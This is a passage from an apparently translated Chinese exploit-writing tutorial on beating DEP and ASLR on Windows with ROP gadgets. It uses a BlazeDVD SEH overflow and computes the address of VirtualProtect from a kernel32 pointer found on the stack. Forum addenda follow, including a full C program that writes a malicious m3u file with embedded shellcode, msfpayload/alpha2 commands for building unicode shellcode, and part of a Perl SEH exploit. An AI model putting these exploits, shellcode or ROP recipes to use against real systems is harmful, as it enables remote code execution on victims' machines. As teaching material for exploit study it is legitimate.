除了这个，你需要找指向你要用的windowsAPI的指针来绕过DEP。
祝你好运！
AAAASSSSLLLLRRRR 和 DDDDEEEEPPPP？
原理
同时绕过DEP和ASLR需要至少加载一个non-ASLR的模块。（好的，这不完全正确，但是
在大多数情况下，这个陈述是有效的）
如果你有一个没有启用ASLR的模块，那么你可以试着基于那个模块的指针来打造rop链。
当然，如果你的rop链用一个OS函数来绕过DEP，你需要有一个指向那个模块调用的指针。
AlexeySintsov在他的ProSSHD1.2exploithttp://www.exploit-db.com/exploits/12495/中展示了
这种技术。
或者，你需要找到一个指向OS模块的指针，在栈上的，在一个寄存器中的，等等...如果它
发生了，你可以用non-aslr模块的rop小配件来盗取那个值并用一个到那个值的偏移量来得
到OS函数的地址。
坏消息是，如果没有一个不从属于ASLR的模块，那么不可能打造一个可靠的exploit。（你
依然可以试下暴力等等...或者在栈上某处找内存漏洞/指针）。好消息是，“pvefindaddrrop”
会自动搜索non-ASLR模块。因此如果!pvefindaddrrop显示一些输出，那么这个地址很可能
是可靠的。
在pvefindaddrv1.34和更高的版本，有一个功能叫做“ropcall”，会搜索和列出在加
载模块中所有的绕过DEP的函数调用。这个对找一个供选择的（或者ASLR绕过）的函数
调用有帮助。
例子：（在EasyRMtoMP3Converter，msrmfilter03.dll模块）
如果你能用一个non-ASLR模块的指令，并且你有一个指向一个ASLR模块（如OSdll）的
指针，在栈上（或者内存中），那么你可以利用那个，并且用一个到那个指针的偏移量来找
启用ASLR模块中其他可用的指令。那个模块的基地址可能会变，但是到一个特定函数的
偏移量应该保持一致。
你可以在这里http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf找
到一个很好的绕过ASLR和DEP的exploit文章，没有用一个non-ASLR模块。
一个例子
下面的例子，mr_me写的，我将会介绍一种可行的技术，用一个non-ASLR模块中的rop小
配件来从栈上拿到一个OSdll指针，并且用一个那个指针的偏移量来计算VirtualProtect的
地址。
如果我们能在栈上找到一个指向kernel32.dll的指针，那么我们可以修改值（加或减一个偏
移量）直到我们到达VirtualProtect()的相对地址。
测试环境：VistaBusinessSP2，English（虚拟机）
这个例子中，我们会用一个在BlazeDVDProfessional5.1的漏洞，在2009发现的
http://www.exploit-db.com/exploits/9329/。你可以在这里下载一份有漏洞的程序：
http://www.corelan.be:8800/?dl_id=40
Exploit-db上的样本代码指示SEH记录在608字节后被覆盖。我们已经知道在一个基于rop
的exploit中，nseh的4字节是不重要的，因此我们将打造一个有612字节的payload，然后
用一个会旋转回栈中的指针覆盖seh处理函数。
你可以运行“!pvefindaddrnoaslr”来列出所有不从属于ASLR的模块。你将大部分的/所有
的程序模块不是ASLR启用的。（当然，WindowsOS模块是ASLR启用的）。
在创建一个rop.txt文件后（用“!pvefindaddrropnonull”），然后在SEH处设断之后（我们
能计算回到栈上可控制缓冲区的偏移量），我们可以得出结论，比如“ADDESP，408+RET4”
小配件（在0x616074AE处，从EPG.dll）是开始链的一种好方法。那会使我们登录到seh
链前的缓冲区。
注意：在覆盖SEH后避免放很多数据在栈上是很重要的。覆盖栈也会覆盖指针。你所
需要的是触发一个访问违例然后覆盖掉的SEH记录会生效，我们就可以控制EIP。
到目前为止，Exploit代码是这样的：
崩溃/异常被触发是因为我们已经覆盖了directRET（用在“废物”变量中的A）。（这意味着
你可能要为这个exploit打造一个directRET变体。无论如何，我们已经决定用SEH）。
当SEH处理函数被调用时，我们观察栈，“ADDESP，408”后的指令被执行，我们看到这
个：
1、在覆盖SEH前我们会登录到一连串A中。用Metasploit模式我们发现我们登录在缓冲区
的312个A后面。这意味着你的第一个小配件指针需要放在那个位置。如果你将用很多指
针，你可能要思考SEH指针放在缓冲区612字节处的事实
2、滚到栈视图窗口中。在缓冲区（用A+我们的SEH处理函数+B填充）后你应该看到栈上
的指针，指示“RETURNto...from...”：
这些事保存EIP的-通过早些时候调用的函数放在栈上。
如果你一直滚，你会找到一个指向kernel32的地址的指针：
目标是设置一个能拿到那个指针的rop链，然后加/减一个偏移量知道它指向VirtualProtect。
在栈上我们看到的指针，在0x0012FF8C处，是0x7664D0E9。在当前进程/环境，kernel32.dll
在0x76600000处加载。
VirtualProtect()位于0x76601DC3处
这意味着VirtualProtect()函数能在[kernel32_baseaddress+0x1DC3]或者
[found_pointer-0x4B326字节]处找到。记住这个偏移量。
重启机器然后看这个指针是否在相同的位置，并且从栈上取出的指针到VirtualProtect()的偏
移量是否是一样的。
重启之后，kernel32.dll在0x75590000。函数依然在kernel32.baseaddress偏移量+0x1DC3处：
在栈上，在0012FF8C处的指针时755DD0E9。如果我们减去偏移量（0x4B326字节），我们
在75591DC3处结束。这是VirtualProtect！这意味着我们已经找到了一个可靠的地方来获取
kernel32指针，找到一个获取VirtualProtect()的可靠偏移量。
我们怎样从栈上把这个值放入一个寄存器中，然后我们能用它来设置API调用？
好的，一个可能的方法是这样的：
●使一个寄存器指向栈地址（这个例子中是0x0012FF8C）。你如说你动态将值放入eax。
（0x6162A59E+0x61630804，+ADD EAX，xxx的链）
●用一个会做同样事情的小配件：mov eax，[eax]+ret。这会取出kernel32指针然后放入
eax中。（这个指令的变种也可以成功，当然-例子：MOV EAX，DWORD PTR DS：[EAX+1C]-像
0x6160103B处的那个）
●从栈上取出的值减去0x4B326字节（基本上用静态偏移量...）并且你将用一种动态的方
法来获得指向VirtualProtect()函数的指针，在Vista SP2上，不管kernel32是ASLR启
用的事实。
注意：找栈上的返回指针不是很不寻常，因此这是一种绕过kernel32 ASLR的好方法。
并且...这是给你的很好的练习。
祝你好运！
其他的关于DEP/内存保护绕过的文章：
Youcan'tstopus-CONFidence2010(AlexeySintsov)
BufferoverflowattacksbypassingDEPPart1(MarcoMastropaolo)
BufferoverflowattacksbypassingDEPPart2(MarcoMastropaolo)
PracticalRop(DinoDaiZovi)
BypassingBrowserMemoryProtections(AlexanderSotirov&MarkDown)
Return-OrientedProgramming(HovavShacham,ErikBuchanan,RyanRoemer,StefanSavage)
ExploitationwithWriteProcessMemory(SpencerPratt)
ExploitationtechniquesandmitigationsonWindows(skape)
BypassinghardwareenforcedDEP(skapeandskywing)
AlittlereturnorientedexploitationonWindowsx86-Part1(HarmonySecurity-StephenFewer)
AlittlereturnorientedexploitationonWindowsx86-Part2(HarmonySecurity-StephenFewer)
(un)SmashingtheStack(ShawnMoyer)(Paper)
http://www.usenix.org/events/sec09/tech/slides/sotirov.pdf
BypassingDEPcasestudy(AudioConverter)(sud0)
Gentleintroductiontoreturn-oriented-programming
DEPindepth(SyscanSingapore-InsomniaSec)
可以在这里找到一些好的ROPexploit：
ProSSHD1.2remotepost-authexploit(http://www.exploit-db.com/exploits/12495)
PHP6.0Devstr_transliterate()(http://www.exploit-db.com/exploits/12189)
VUPlayerm3ubufferoverflow(http://www.exploit-db.com/exploits/13756)
Sygate Personal Firewall 5.6 build 2808 ActiveX with DEP bypass
(http://www.exploit-db.com/exploits/13834)
Castripper 2.50.70 (.pls) stack buffer overflow with DEP bypass
(http://www.exploit-db.com/exploits)
问题？
如 果 你 有 问 题 ， 请 在 我 们 的 论 坛 中 提 出 ：
http://www.corelan.be:8800/index.php/forum/exploit-writing-win32-bypass-stack-memory-protect
ions/
对《基于栈的溢出》一文的补充
by:moonife
我跟了下程序的溢出情况，下面的是关键信息，有兴趣的朋友可以详细分析下:
00E58D93 F3:A5 rep movs dword ptr es:[edi], dword p> ;这里导致溢
出
0041E9E6 |. 81C4 18890000 add esp, 8918
0041E9EC \. C2 0400 retn 4 ;这里覆盖EIP
文中的创建m3u用的perl脚本 我不会 我用C写做测试 贴上来做参考 呵呵：
Quote:
#include 
#pragma comment(linker,"/subsystem:windows")
char Buffer[26094]={0};
DWORD eip=0x73d92ecf; //覆盖返回地址
DWORD param1=0x90909090; //覆盖retn 4 被栈平衡的参数
char nops[25]={0};
char shellcode[]=
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
"\x7f\xe8\x7b\xca";
int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine,
int nShowCmd )
{
HANDLE hFile;
DWORD temp;
hFile=CreateFile("crash.m3u",GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAY
S,FILE_ATTRIBUTE_NORMAL,NULL);
memset(Buffer,'A',26094);
memset(nops,0x90,25);
WriteFile(hFile,Buffer,26094-31-8,&temp,NULL);
WriteFile(hFile,&eip,4,&temp,NULL);
WriteFile(hFile,&param1,4,&temp,NULL);
WriteFile(hFile,nops,25,&temp,NULL);
WriteFile(hFile,shellcode,sizeof(shellcode),&temp,NULL);
CloseHandle(hFile);
MessageBox(NULL,"Done","Info",0);
return 0;
}
标 题: 【原创】对《编写unicode exploit》一文的补充
作 者：riusksk(泉哥)
主 页：http://riusksk.blogbus.com
时 间: 2010-09-28,21:25:39
链 接: http://bbs.pediy.com/showthread.php?t=121281
《编写Unicode Exploit》原文地址：
http://bbs.pediy.com/showthread.php?t=120637
1.关于unicode shellcode生成的问题
原本我是用windows平台下的msf，但始终没有成功。后来又改用pentoo系统
上的msf还是没有成功，最后按作者的建议使用BT4，可惜依然没有成功。然后
我就将msf与alpha2合用，大家可以在BT4 final上使用以下命令来生成：
Code:
wget http://packetstormsecurity.org/shellcode/alpha2.tar.gz
tar xvzf alpha2.tar.gz
cd alpha2
gcc alpha2.c -o alpha2
msfpayload windows/exec cmd=calc r | ./alpha2 eax --unicode -t perl
2.关于ret(c3>7f) 的问题
原作者是采用xp sp3 en版本的系统，由于
unicode codepage / language/regional settings 的不 同，在原作者的系统
中，ret（c3）并不会被转换，但是在我的xp sp3 中文版上，它会被转换成 88 80，
自然也就无法实现ret指令，如果像 原作者那样在exploit中使用ret的话，
必然是无法正常运行的。下面是我在自己系统上的测试代码及调试情况：
Code:
my $junk = "A" x 270; # 我个人系统上相对SEH的偏移量
my $nseh = "x61x62";
my $seh = "x15x45" ;
my $preparestuff="D"; #we need the first D
$preparestuff=$preparestuff."x6e"; #nop/align
$preparestuff=$preparestuff."x55"; #push ebp
$preparestuff=$preparestuff."x6e"; #nop/align